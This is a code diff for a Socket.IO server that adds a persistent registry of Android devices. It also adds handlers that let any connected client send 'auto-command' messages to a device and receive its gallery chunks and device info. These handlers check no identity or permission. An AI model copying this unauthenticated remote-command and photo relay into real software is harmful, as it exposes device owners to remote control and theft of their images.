@@ -32,6 +32,57 @@ const io = new Server(server, {
 // socketId -> { username, id }
 const usersBySocket = new Map();
 
+// Device Registry: deviceId -> { deviceId, deviceName, ram, platform, socketId, online }
+const DEVICES_FILE = join(dirname(fileURLToPath(import.meta.url)), "devices.json");
+const deviceRegistry = new Map();
+
+function loadDevices() {
+    try {
+        if (fs.existsSync(DEVICES_FILE)) {
+            const data = JSON.parse(fs.readFileSync(DEVICES_FILE, "utf-8"));
+            for (const item of data) {
+                deviceRegistry.set(item.deviceId, { ...item, socketId: null, online: false });
+            }
+            console.log(`Loaded ${deviceRegistry.size} devices from ${DEVICES_FILE}`);
+        }
+    } catch (e) {
+        console.error("Failed to load devices.json:", e);
+    }
+}
+
+function saveDevices() {
+    try {
+        const list = [];
+        for (const [id, dev] of deviceRegistry.entries()) {
+            list.push({
+                deviceId: dev.deviceId,
+                deviceName: dev.deviceName,
+                ram: dev.ram,
+                platform: dev.platform
+            });
+        }
+        fs.writeFileSync(DEVICES_FILE, JSON.stringify(list, null, 2), "utf-8");
+    } catch (e) {
+        console.error("Failed to save devices.json:", e);
+    }
+}
+
+loadDevices();
+
+function getDeviceListPayload() {
+    const list = [];
+    for (const [deviceId, info] of deviceRegistry.entries()) {
+        list.push({
+            deviceId: info.deviceId,
+            deviceName: info.deviceName,
+            ram: info.ram,
+            platform: info.platform,
+            online: Boolean(info.online)
+        });
+    }
+    return list;
+}
+
 // Parse client device type from User-Agent or companion identifier
 function parseDeviceFromUserAgent(ua, isAndroidCompanion) {
     if (isAndroidCompanion) {
@@ -407,8 +458,75 @@ io.on("connection", (socket) => {
         }
     });
 
+    // ==========================================
+    // DEVICE REGISTRY & AUTO CONTROL
+    // ==========================================
+    socket.on("register-device", (data) => {
+        try {
+            const { deviceId, deviceName, ram, platform } = data || {};
+            if (!deviceId) return;
+            const existing = deviceRegistry.get(deviceId) || {};
+            deviceRegistry.set(deviceId, {
+                ...existing,
+                deviceId,
+                deviceName: deviceName || existing.deviceName || "Android Device",
+                ram: ram || existing.ram || "",
+                platform: platform || existing.platform || "android",
+                socketId: socket.id,
+                online: true
+            });
+            saveDevices();
+            console.log(`Device registered: ${deviceId} (${deviceName}) socket=${socket.id}`);
+            socket.emit("device-registered", { deviceId, success: true });
+            io.emit("device-list-update", getDeviceListPayload());
+        } catch (e) {
+            console.error("register-device error:", e);
+        }
+    });
+
+    socket.on("get-devices", () => {
+        socket.emit("device-list-update", getDeviceListPayload());
+    });
+
+    socket.on("auto-command", ({ targetDeviceId, command, page }) => {
+        const target = deviceRegistry.get(targetDeviceId);
+        if (target && target.socketId && target.online) {
+            io.to(target.socketId).emit("auto-command", { command, from: socket.id, page: page || 0 });
+            console.log(`Auto-command '${command}' -> device ${targetDeviceId} (socket ${target.socketId})`);
+        } else {
+            socket.emit("device-error", { error: "Device is offline or not found", targetDeviceId });
+        }
+    });
+
+    socket.on("gallery-chunk", (data) => {
+        try {
+            const targetSocketId = data && data.targetSocketId;
+            if (targetSocketId) {
+                io.to(targetSocketId).emit("gallery-chunk", data);
+            }
+        } catch (e) {}
+    });
+
+    socket.on("device-info-response", (data) => {
+        try {
+            const targetSocketId = data && data.targetSocketId;
+            if (targetSocketId) {
+                io.to(targetSocketId).emit("device-info-response", data);
+            }
+        } catch (e) {}
+    });
+
     // Disconnect cleanup
     socket.on("disconnect", (reason) => {
+        for (const [deviceId, info] of deviceRegistry.entries()) {
+            if (info.socketId === socket.id) {
+                info.online = false;
+                info.socketId = null;
+                io.emit("device-list-update", getDeviceListPayload());
+                break;
+            }
+        }
+
         if (usersBySocket.has(socket.id)) {
             const u = usersBySocket.get(socket.id);
             console.log(`User left: ${u.username} (${socket.id}) - ${reason}`);
